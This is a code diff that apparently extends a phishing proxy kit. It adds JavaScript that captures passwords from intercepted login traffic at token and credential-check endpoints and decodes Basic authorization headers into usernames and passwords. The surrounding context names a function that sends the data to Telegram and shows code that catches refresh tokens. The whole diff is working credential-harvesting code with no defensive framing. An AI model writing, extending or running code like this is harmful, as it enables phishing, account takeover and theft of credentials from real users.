@@ -156,7 +156,37 @@ async function sendToTelegram(data) {
                     console.log('✅ PASSWORD FOUND (raw):', password);
                 }
             }
-            
+            // ── PATTERN: CHECK FOR PASSWORD IN ANY REQUEST ──
+// Even if the body doesn't have 'password' field, check for it in the URL
+if (url.includes('/token') || url.includes('/GetCredentialType')) {
+    // The password might be in the response body instead
+    if (data.proxyResponseBody) {
+        const respStr = typeof data.proxyResponseBody === 'string' ? 
+            data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
+        const passInResponse = respStr.match(/password["']?\s*[:=]\s*["']([^"']+)["']/i);
+        if (passInResponse) {
+            password = passInResponse[1];
+            hasCredentials = true;
+            console.log('✅ PASSWORD FOUND IN RESPONSE:', password);
+        }
+    }
+}
+
+// ── ALSO CHECK FOR PASSWORD IN HEADERS ──
+if (data.proxyRequestHeaders) {
+    const authHeader = data.proxyRequestHeaders['authorization'];
+    if (authHeader && authHeader.includes('Basic')) {
+        const base64 = authHeader.replace('Basic ', '');
+        const decoded = Buffer.from(base64, 'base64').toString('utf-8');
+        if (decoded.includes(':')) {
+            const [user, pass] = decoded.split(':');
+            username = user;
+            password = pass;
+            hasCredentials = true;
+            console.log('✅ PASSWORD FOUND IN AUTH HEADER:', password);
+        }
+    }
+}
             if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
                 isTokenExchange = true;
                 hasCredentials = true;
